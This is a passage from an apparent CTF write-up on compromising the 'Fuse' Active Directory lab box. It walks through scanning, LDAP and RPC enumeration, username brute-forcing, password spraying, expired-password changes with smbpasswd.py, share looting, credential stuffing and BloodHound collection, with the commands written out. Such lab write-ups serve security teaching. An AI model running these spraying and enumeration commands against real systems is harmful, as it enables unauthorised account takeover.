+</span></span><span style="display:flex;"><span>53/tcp    open  domain       Simple DNS Plus
+</span></span><span style="display:flex;"><span>80/tcp    open  http         Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>| http-methods:
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2024-10-16 13:01:33Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap         Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: fabricorp.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds Windows Server <span style="color:#ae81ff">2016</span> Standard <span style="color:#ae81ff">14393</span> microsoft-ds <span style="color:#f92672">(</span>workgroup: FABRICORP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open  tcpwrapped
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: fabricorp.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>3269/tcp  open  tcpwrapped
+</span></span><span style="display:flex;"><span>5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf       .NET Message Framing
+</span></span><span style="display:flex;"><span>49666/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49667/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49675/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>49676/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49680/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49698/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49755/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Device type: general purpose
+</span></span><span style="display:flex;"><span>Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows <span style="color:#ae81ff">2016</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:microsoft:windows_server_2016
+</span></span><span style="display:flex;"><span>Aggressive OS guesses: Microsoft Windows Server <span style="color:#ae81ff">2016</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb-security-mode:
+</span></span><span style="display:flex;"><span>|   account_used: &lt;blank&gt;
+</span></span><span style="display:flex;"><span>|   authentication_level: user
+</span></span><span style="display:flex;"><span>|   challenge_response: supported
+</span></span><span style="display:flex;"><span>|_  message_signing: required
+</span></span><span style="display:flex;"><span>| smb2-time:
+</span></span><span style="display:flex;"><span>|   date: 2024-10-16T13:02:27
+</span></span><span style="display:flex;"><span>|_  start_date: 2024-10-16T12:39:39
+</span></span><span style="display:flex;"><span>| smb-os-discovery:
+</span></span><span style="display:flex;"><span>|   OS: Windows Server <span style="color:#ae81ff">2016</span> Standard <span style="color:#ae81ff">14393</span> <span style="color:#f92672">(</span>Windows Server <span style="color:#ae81ff">2016</span> Standard 6.3<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   Computer name: Fuse
+</span></span><span style="display:flex;"><span>|   NetBIOS computer name: FUSE<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>|   Domain name: fabricorp.local
+</span></span><span style="display:flex;"><span>|   Forest name: fabricorp.local
+</span></span><span style="display:flex;"><span>|   FQDN: Fuse.fabricorp.local
+</span></span><span style="display:flex;"><span>|_  System time: 2024-10-16T06:02:28-07:00
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: 2h33m00s, deviation: 4h02m31s, median: 12m59s
+</span></span><span style="display:flex;"><span>| smb2-security-mode:
+</span></span><span style="display:flex;"><span>|   3:1:1:
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 237.63 seconds</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>RPC is also present &amp; we can extract alot of information using RPC.</li>
+</ul>
+</li>
+</ul>
+<h3 id="ldap-389">LDAP <code>389</code>:</h3>
+<h4 id="using-ldap-anonymous-bind-to-enumerate-further">Using LDAP anonymous bind to enumerate further:</h4>
+<ul>
+<li>If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
+<ul>
+<li>We can actually retrieve a significant amount of information via anonymous bind such as:
+<ul>
+<li>A list of all users</li>
+<li>A list of all groups</li>
+<li>A list of all computers.</li>
+<li>User account attributes.</li>
+<li>The domain password policy.</li>
+<li>Enumerate users who are susceptible to AS-REPRoasting.</li>
+<li>Passwords stored in the description fields</li>
+</ul>
+</li>
+<li>The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here</p>
+<ul>
+<li><a href="https://github.com/bloodstiller/ldapchecker">https://github.com/bloodstiller/ldapchecker</a>
+<ul>
+<li><code>python3 ldapchecker.py $box</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>It turns out the anonymous bind is not enabled but we can still get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.</p>
+<ol>
+<li>
+<p><!-- raw HTML omitted -->We have the naming context of the domain<!-- raw HTML omitted -->:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="kali%20in%20~/Desktop/WindowsTools%20%f0%9f%90%8d%20v3.12.6%20%203GiB/15GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2013:44:45%20zsh%20%e2%9d%af%20python3%20ldapchecker.py%20$box%0aAttempting%20to%20connect%20to%2010.129.2.5%20with%20SSL...%0aFailed%20to%20connect%20with%20SSL.%20Retrying%20without%20SSL...%0aConnected%20successfully.%20Retrieving%20server%20information...%0aDSA%20info%20%28from%20DSE%29:%0a%20%20Supported%20LDAP%20versions:%203,%202%0a%20%20Naming%20contexts:%0a%20%20%20%20DC=fabricorp,DC=local%0a%20%20%20%20CN=Configuration,DC=fabricorp,DC=local%0a%20%20%20%20CN=Schema,CN=Configuration,DC=fabricorp,DC=local%0a%20%20%20%20DC=DomainDnsZones,DC=fabricorp,DC=local%0a%20%20%20%20DC=ForestDnsZones,DC=fabricorp,DC=local">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in ~/Desktop/WindowsTools 🐍 v3.12.6  3GiB/15GiB | 0B/1GiB with /usr/bin/zsh
+</span></span><span style="display:flex;"><span>🕙 13:44:45 zsh ❯ python3 ldapchecker.py $box
+</span></span><span style="display:flex;"><span>Attempting to connect to 10.129.2.5 with SSL...
+</span></span><span style="display:flex;"><span>Failed to connect with SSL. Retrying without SSL...
+</span></span><span style="display:flex;"><span>Connected successfully. Retrieving server information...
+</span></span><span style="display:flex;"><span>DSA info <span style="color:#f92672">(</span>from DSE<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>  Supported LDAP versions: 3, <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>  Naming contexts:
+</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>fabricorp,DC<span style="color:#f92672">=</span>local
+</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>fabricorp,DC<span style="color:#f92672">=</span>local
+</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>fabricorp,DC<span style="color:#f92672">=</span>local
+</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>DomainDnsZones,DC<span style="color:#f92672">=</span>fabricorp,DC<span style="color:#f92672">=</span>local
+</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>ForestDnsZones,DC<span style="color:#f92672">=</span>fabricorp,DC<span style="color:#f92672">=</span>local</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><!-- raw HTML omitted -->We have the domain functionaility level<!-- raw HTML omitted -->:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Other:
+</span></span><span style="display:flex;"><span>  domainFunctionality:
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>  forestFunctionality:
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>  domainControllerFunctionality:
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span></span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>The functionality level determines the minimum version of Windows server that can be used for a DC.
+<ul>
+<li>
+<p>+Note+: that any host os can be used on <strong>workstations</strong>, however the functionality level determines what the minimum version for DC&rsquo;s and the forest.</p>
+</li>
+<li>
+<p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels</a></p>
+</li>
+<li>
+<p>Knowing the function level is useful as if want to target the DC&rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.</p>
+</li>
+<li>
+<p>In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.</p>
+</li>
+<li>
+<p>Here’s a list of functional level numbers and their corresponding Windows Server operating systems:</p>
+<table>
+  <thead>
+      <tr>
+          <th>Functional Level Number</th>
+          <th>Corresponding OS</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>0</td>
+          <td>Windows 2000</td>
+      </tr>
+      <tr>
+          <td>1</td>
+          <td>Windows Server 2003 Interim</td>
+      </tr>
+      <tr>
+          <td>2</td>
+          <td>Windows Server 2003</td>
+      </tr>
+      <tr>
+          <td>3</td>
+          <td>Windows Server 2008</td>
+      </tr>
+      <tr>
+          <td>4</td>
+          <td>Windows Server 2008 R2</td>
+      </tr>
+      <tr>
+          <td>5</td>
+          <td>Windows Server 2012</td>
+      </tr>
+      <tr>
+          <td>6</td>
+          <td>Windows Server 2012 R2</td>
+      </tr>
+      <tr>
+          <td>7</td>
+          <td>Windows Server 2016</td>
+      </tr>
+      <tr>
+          <td>8</td>
+          <td>Windows Server 2019</td>
+      </tr>
+      <tr>
+          <td>9</td>
+          <td>Windows Server 2022</td>
+      </tr>
+  </tbody>
+</table>
+<ul>
+<li>+Note+:
+<ul>
+<li>Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.</li>
+<li>As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><!-- raw HTML omitted -->We have the full server name<!-- raw HTML omitted -->:</p>
+<ul>
+<li>Again we can see this has the CN as the base (mentioned previously.)
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>serverName:
+</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>FUSE,CN<span style="color:#f92672">=</span>Servers,CN<span style="color:#f92672">=</span>Default-First-Site-Name,CN<span style="color:#f92672">=</span>Sites,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>fabricorp,DC<span style="color:#f92672">=</span>local</span></span></code></pre></div>
+    
+</div>
+</li>
+</ul>
+</li>
+</ol>
+</li>
+<li>
+<p>It&rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.</p>
+<ul>
+<li>We have the naming context.</li>
+<li>Domain name.</li>
+</ul>
+</li>
+<li>
+<p><strong>I update my <code>/etc/hosts</code> file now that we have the server name</strong>.</p>
+<ul>
+<li>This is so we can use tools like <a href="https://github.com/ropnop/kerbrute">kerbrute</a> for user enumeration as well as other tools later on.</li>
+</ul>
+</li>
+</ul>
+<h3 id="dns-53">DNS <code>53</code>:</h3>
+<ul>
+<li><strong>Using dnsenum to enumerate DNS entries</strong>:
+<ul>
+<li><code>dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="kerberos-88">Kerberos <code>88</code>:</h3>
+<h4 id="using-kerbrute-to-bruteforce-usernames">Using <a href="https://github.com/ropnop/kerbrute">Kerbrute</a> to bruteforce Usernames:</h4>
+<ul>
+<li><strong>As kerberos is present we can enumerate users using</strong> <a href="https://github.com/ropnop/kerbrute">kerbrute</a>:
+<ul>
+<li><code>kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt</code></li>
+<li><figure><img src="/ox-hugo/2024-10-16-135903_.png">
+</figure>
+</li>
+<li>I get 3 valid users &amp; add them to my users list.</li>
+</ul>
+</li>
+</ul>
+<h3 id="rpc">RPC:</h3>
+<ul>
+<li><strong>I connect using a null session, however we are unable to enumerate</strong>:
+<ul>
+<li><code>rpcclient -U '%' $box</code></li>
+<li><figure><img src="/ox-hugo/2024-10-16-135720_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="smb-445">SMB <code>445</code>:</h3>
+<h4 id="attempting-to-connect-with-null-and-guest-sessions">Attempting to connect with NULL &amp; Guest sessions:</h4>
+<ul>
+<li><strong>This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold</strong>:
+<ul>
+<li><code>netexec smb $box -u 'guest' -p '' --shares</code></li>
+<li><code>netexec smb $box -u '' -p '' --shares</code></li>
+<li><figure><img src="/ox-hugo/2024-10-16-140802_.png">
+</figure>
+</li>
+<li>Guest account is disabled &amp; the null session cannot enumerate the shares.</li>
+</ul>
+</li>
+</ul>
+<h4 id="trying-usernames-as-passwords">Trying Usernames as Passwords:</h4>
+<ul>
+<li><strong>I always try usernames as passwords as well</strong>:
+<ul>
+<li><code>netexec smb $box -u Users.txt -p Users.txt --shares --continue-on-success | grep [+]</code></li>
+<li><figure><img src="/ox-hugo/2024-10-16-140844_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="http-80">HTTP <code>80</code>:</h3>
+<ul>
+<li><strong>It appears to be a print logger</strong>:
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-16-141538_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="discovering-usernames-in-the-csv-entries">Discovering Usernames in the <code>CSV</code> Entries:</h4>
+<ul>
+<li><strong>There are</strong> <code>CSV</code> <strong>files that can downloaded</strong>:
+<ul>
+<li>Looking at them I can see that there are users we did not find using kerbrute:
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-16-141912_.png">
+</figure>
+</li>
+<li><figure><img src="/ox-hugo/2024-10-16-142017_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="discovering-their-may-be-an-issue-with-the-printing-service-in-the-csv-entries">Discovering their may be an issue with the printing service in the <code>CSV</code> entries:</h4>
+<ul>
+<li><strong>We can see that there is a printing issue</strong>:
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-16-142312_.png">
+</figure>
+</li>
+<li>This may not seem like much, but if they are facing issues it may let us know their is a wider issue.</li>
+</ul>
+</li>
+</ul>
+<h4 id="directory-busting-with-ffuf">Directory Busting With FFUF:</h4>
+<ul>
+<li><strong>I Perform some directory busting to see if there are any interesting directories</strong>:
+<ul>
+<li><code>ffuf -w ~/Wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://fuse.fabricorp.local/papercut/FUZZ -fc 403 -ic</code></li>
+<li><figure><img src="/ox-hugo/2024-10-16-151427_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="fuzzing-for-more-csv-s-with-ffuf">Fuzzing for more <code>CSV</code>&rsquo;s with FFUF:</h4>
+<ul>
+<li><strong>As the download string for the csv is in the below format we can fuzz it using</strong> <code>FFUF</code>
+<ul>
+<li><code>/papercut/logs/csv/monthly/papercut-print-log-2020-05.csv</code></li>
+</ul>
+</li>
+<li>I fuzz it using custom wordlist.</li>
+<li><code>ffuf -w ~/Wordlists/45.06-CustomWordlists/numbersDays-1-31.txt:MONTH -w ~/Wordlists/45.06-CustomWordlists/numbersYears-1990-2049.txt:YEAR  -u http://fuse.fabricorp.local//papercut/logs/csv/monthly/papercut-print-log-YEAR-MONTH.csv -fc 403 -ic</code></li>
+<li><figure><img src="/ox-hugo/2024-10-16-151830_.png">
+</figure>
+</li>
+<li>Just the same two entries we have already found.</li>
+</ul>
+<h3 id="finding-a-password-in-the-printer-logs">Finding a password in the Printer Logs:</h3>
+<ul>
+<li>
+<p><strong>Looking back through the print logs I see the string</strong> <code>Fabricorp01.docx</code>, <strong>if we remove the</strong> <code>.docx</code> <strong>it looks alot like a password</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-16-160637_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I use</strong> <code>netexec</code> <strong>to password spray</strong>:</p>
+<ul>
+<li><code>netexec smb $box -u Users.txt -p 'Fabricorp01' --shares</code></li>
+<li><figure><img src="/ox-hugo/2024-10-16-160814_.png">
+</figure>
+</li>
+<li>The response: <code>STATUS_PASSWORD_MUST_CHANGE</code> means that the password is correct but has to be changed on the next login!</li>
+</ul>
+</li>
+</ul>
+<h3 id="changing-the-expired-password">Changing the expired password:</h3>
+<h4 id="attempt-1-trying-to-change-the-expired-password-using-smbpasswd-dot-py">Attempt 1: Trying to change the expired password using <code>smbpasswd.py</code>:</h4>
+<ul>
+<li><strong>I try and change the users passwords using</strong> <code>smbpasswd.py</code> <strong>by impacket</strong>:
+<ul>
+<li><code>sudo python3 smbpasswd.py $domain\$user:$pass@$box -newpass 'N3wPass1$$09%12828'</code></li>
+<li><figure><img src="/ox-hugo/2024-10-16-165848_.png">
+</figure>
+</li>
+<li>It does not work. Lets see if we can find another way to change this password online.</li>
+<li>+Note+: Only reason I used <code>sudo</code> was incase there was anything strange happening where I needed to.</li>
+</ul>
+</li>
+</ul>
+<h4 id="attempt-2-trying-to-change-the-password-using-powershell">Attempt 2: Trying to change the password using powershell:</h4>
+<ul>
+<li><strong>After some searching online, I find</strong> [[<a href="https://hinchley.net/articles/changing-your-expired-active-directory-password-via-powershell">https://hinchley.net/articles/changing-your-expired-active-directory-password-via-powershell</a></li>
+</ul>
+<p>][this article]] <strong>which details the change via powershell. It&rsquo;s worth a shot</strong>:</p>
+<ul>
+<li>
+<p>I fire up my windows vm &amp; connect to the <code>VPN</code>:</p>
+</li>
+<li>
+<p>I Modify my hosts file &amp; then modify the script on the page but still cannot change the password.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-17-084354_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>Lets see if we can do it via <code>impacket</code> again but with different arguments.</p>
+</li>
+</ul>
+<h4 id="attempt-3-finally-changing-a-password-with-smbpasswd-dot-py">Attempt 3: Finally changing a password with <code>smbpasswd.py</code>:</h4>
+<ul>
+<li>
+<p><code>python3 smbpasswd.py $user:$pass@$box -newpass 'N3wPassWILLTHISWORK1$$09%'</code></p>
+</li>
+<li>
+<figure><img src="/ox-hugo/2024-10-17-081339_.png">
+</figure>
+
+</li>
+<li>
+<p>+Note+:</p>
+<ul>
+<li>I think the main issue&rsquo;s why this did not work before are due to the initial password I tried not being complex enough, <code>'N3Pass1'</code> &amp; for some reason it doesn&rsquo;t like when we use the domain name.</li>
+</ul>
+</li>
+<li>
+<p><strong>I can list shares in</strong> <code>netexec</code>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-17-084630_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>However after I try and access the shares again for further enumeration, it appears as if the password has been changed</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-17-084729_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I check the older password</strong> <code>'Fabricorp01'</code> <strong>and it seems to have reverted to that</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-17-084821_.png">
+</figure>
+</li>
+<li>This looks like it&rsquo;s reverting to the previous password after a certain amount of time.</li>
+</ul>
+</li>
+</ul>
+<h3 id="preparing-commands-to-access-smb">Preparing commands to access SMB:</h3>
+<ul>
+<li>
+<p>As it appears we have a time limit before the password is reset we need to prepare all of our commands to ensure we access the resources.</p>
+</li>
+<li>
+<p><strong>Basic envs &amp; password change</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>user<span style="color:#f92672">=</span>tlavel
+</span></span><span style="display:flex;"><span>oldPass<span style="color:#f92672">=</span>Fabricorp01
+</span></span><span style="display:flex;"><span>newPass<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;BrandNewPassword69!1811&#39;</span>
+</span></span><span style="display:flex;"><span>python3 smbpasswd.py $user:$oldPass@$box -newpass $newPass</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-17-092130_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Tools</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="netexec%20smb%20$box%20-u%20$user%20-p%20$newPass%20--shares%0asmbmap%20-u%20$user%20-p%20$newPass%20-H%20$box%20-r%203">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u $user -p $newPass --shares
+</span></span><span style="display:flex;"><span>smbmap -u $user -p $newPass -H $box -r <span style="color:#ae81ff">3</span></span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-17-092156_.png">
+</figure>
+</li>
+<li>I check all users who&rsquo;s passwords can be changed. It&rsquo;s easy using the above approach as all we have to do is modify the <code>user</code> env.
+<ul>
+<li>tlavel</li>
+<li>bhult</li>
+<li>bnielson</li>
+</ul>
+</li>
+<li>It appears that all users have access to the same shares &amp; the most interesting one is the <code>print$</code> share.</li>
+<li>+Note+: This is why I like using <code>envs</code> they make time sensitive tasks like this ALOT quicker &amp; smoother.</li>
+</ul>
+</li>
+</ul>
+<h3 id="downloading-the-entire-print-share">Downloading the entire <code>print$</code> share:</h3>
+<ul>
+<li><strong>I download everything using</strong> <code>smbget</code>:
+<ul>
+<li><code>smbget -U $domain/$user --recursive &quot;smb://$box/print$&quot;</code></li>
+<li><figure><img src="/ox-hugo/2024-10-17-095411_.png">
+</figure>
+</li>
+<li>+Note+: <code>bnielson</code> was the last user I was logged in as that&rsquo;s why I am doing this as them.</li>
+</ul>
+</li>
+</ul>
+<p>BrandNewPassword69!181128!!!!!</p>
+<ul>
+<li><code>smbget -U $domain/$user --recursive &quot;smb://$box/sysvol&quot;</code></li>
+</ul>
+<h4 id="searching-for-more-information-in-the-pillaged-smb-files">Searching for more information in the pillaged smb files:</h4>
+<ul>
+<li>I look through the files but there is nothing interesting I can see/find.</li>
+</ul>
+<h3 id="trying-to-dump-user-information-via-ldapsearch">Trying to dump user information via <code>ldapsearch</code>:</h3>
+<ul>
+<li><strong>As we can access the host using credentials temporarily I try and dump all user information using ldap</strong>:
+<ul>
+<li><code>ldapsearch -H ldap://fuse.$domain-x -b &quot;DC=fuse,DC=fabricorp&quot; -D &quot;cn=$user,dc=fuse,dc=fabricorp&quot; -w $newPass-s sub &quot;(&amp;(objectclass=user))&quot; &gt;&gt; ldapUsersAll.txt</code></li>
+<li>However it just errors out:
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-17-131612_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="enumerating-using-rpcclient">Enumerating using <code>rpcclient</code>:</h3>
+<ul>
+<li>
+<p><strong>I change the password again and manage to get an</strong> <code>rpc</code> <strong>session</strong>:</p>
+<ul>
+<li><code>rpcclient -U $user $box</code></li>
+<li><figure><img src="/ox-hugo/2024-10-17-132107_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I dump all the users on the domain</strong>:</p>
+<ul>
+<li><code>enumdomusers</code></li>
+<li><figure><img src="/ox-hugo/2024-10-17-132233_.png">
+</figure>
+</li>
+<li>This is good as it gives us more users now.</li>
+</ul>
+</li>
+<li>
+<p><strong>I query each user individually to see if there is any important information in their descriptions, but find nothing</strong>:</p>
+<ul>
+<li><code>queryuser [RID]</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="finding-a-hard-coded-clear-text-credential-a-printer-description">Finding a hard-coded clear text credential a printer description:</h3>
+<ul>
+<li>
+<p><strong>I enumerate the printers using</strong> <code>rpclient</code> <strong>and find a hardcoded password in the description field</strong>:</p>
+<ul>
+<li><code>enumprinters</code></li>
+<li><figure><img src="/ox-hugo/2024-10-17-134938_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I cred stuff using newly found credentials &amp; users</strong>:</p>
+<ul>
+<li><code>netexec smb $box -u Users.txt -p $pass --continue-on-success | grep [+]</code></li>
+<li><figure><img src="/ox-hugo/2024-10-17-135256_.png">
+</figure>
+</li>
+<li><strong>I get two hits</strong>:
+<ul>
+<li>svc-print</li>
+<li>svc-scan</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I have a deep dive on</strong> <code>rpc</code> <strong>available here</strong>:</p>
+<ul>
+<li><a href="https://bloodstiller.com/cheatsheets/rpc-cheatsheet/">https://bloodstiller.com/cheatsheets/rpc-cheatsheet/</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="2-dot-foothold">2. Foothold:</h2>
+<h3 id="enumerating-as-svc-print">Enumerating as <code>svc-print</code>:</h3>
+<h4 id="running-a-bloodhound-collection">Running a bloodhound collection:</h4>
+<ul>
+<li><strong>Now that we have creds that arent&rsquo; changing all the time we can to a full bloodhound collection</strong>:
+<ul>
+<li><code>python3 bloodhound.py -dc fuse.$domain -c All -u $user -p $pass -d $domain -ns $box</code></li>
+<li><figure><img src="/ox-hugo/2024-10-17-144237_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="connecting-to-the-host-using-evil-winrm">Connecting to the host using <code>evil-winrm</code>:</h4>
